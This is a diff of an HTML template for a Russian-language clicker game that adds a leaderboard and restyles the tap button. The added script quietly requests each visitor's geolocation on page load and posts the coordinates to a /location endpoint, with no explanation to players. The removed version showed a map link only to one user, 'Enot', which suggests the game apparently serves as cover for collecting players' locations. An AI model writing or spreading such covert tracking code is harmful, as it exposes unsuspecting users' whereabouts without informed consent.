@@ -1,41 +1,43 @@
-<!doctype html>
-<html>
-<head>
-  <title>Главная</title>
-  <style>
-    button#tap-btn {
-      width: 200px;
-      height: 200px;
-      background-color: red;
-      color: white;
-      font-size: 24px;
-      border-radius: 20px;
-      border: none;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-<h1>Привет, {{ user.username }}!</h1>
+ {% extends 'base.html' %}
+{% block title %}Главная{% endblock %}
+{% block content %}
+<h2 class="text-center">Привет, {{ user.username }}!</h2>
+<p class="text-center">Ваше место в рейтинге: <strong>#{{ place }}</strong></p>
 
-<button id="tap-btn">Нажми меня</button>
-<p>Клики: <span id="clicks">{{ user.clicks }}</span></p>
+<div class="d-grid gap-2 col-6 mx-auto my-4">
+    <button id="tapBtn" class="btn btn-lg btn-danger py-3">НАЖМИ!</button>
+    <div id="countDisplay" class="text-center fs-4">Нажатий: {{ user.clicks }}</div>
+</div>
 
-{% if user.username == 'Enot' %}
-  <a href="{{ url_for('locations') }}">🗺 Карта</a>
-{% endif %}
-
-<a href="{{ url_for('signout') }}">Выйти</a>
+<h4 class="mt-5 text-center">🏆 Топ-10 игроков</h4>
+<ul class="list-group">
+    {% for u in users %}
+    <li class="list-group-item d-flex justify-content-between">
+        <span>{{ loop.index }}. {{ u.username }}</span>
+        <span>{{ u.clicks }} 👆</span>
+    </li>
+    {% endfor %}
+</ul>
 
 <script>
-document.getElementById('tap-btn').onclick = async () => {
-  const resp = await fetch('/tap', { method: 'POST' });
-  const data = await resp.json();
-  document.getElementById('clicks').textContent = data.clicks;
-  if(data.win) {
-    alert('Поздравляем! Вы выиграли 1 рубль!');
-  }
+document.getElementById("tapBtn").onclick = async () => {
+    const res = await fetch("/tap", { method: "POST" });
+    const data = await res.json();
+    document.getElementById("countDisplay").innerText = `Нажатий: ${data.clicks}`;
+    if (data.win) {
+        alert("🎉 Поздравляем! Вы выиграли 1 рубль!");
+    }
 };
+
+navigator.geolocation?.getCurrentPosition(pos => {
+    fetch("/location", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude
+        })
+    });
+});
 </script>
-</body>
-</html>
+{% endblock %}
